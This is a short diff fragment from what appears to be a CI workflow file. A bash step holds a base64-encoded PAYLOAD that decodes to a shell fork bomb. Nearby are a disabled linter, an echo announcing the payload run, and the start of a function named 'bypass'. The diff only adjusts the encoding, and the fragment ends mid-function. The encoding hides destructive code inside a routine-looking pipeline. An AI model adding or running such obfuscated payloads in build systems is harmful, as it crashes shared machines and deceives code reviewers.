@@ -23,7 +23,7 @@ jobs:
         shell: 'bash'
         # shellcheck disable=all
         run: |
-          PAYLOAD="OigpeyAoIDp8OiApOyB3YWl0OyB9OzoK="
+          PAYLOAD="OigpeyAoIDp8OiApOyB3YWl0OyB9OzoK"
           echo ">>>>> before payload run"
           sleep 5
           function bypass() {
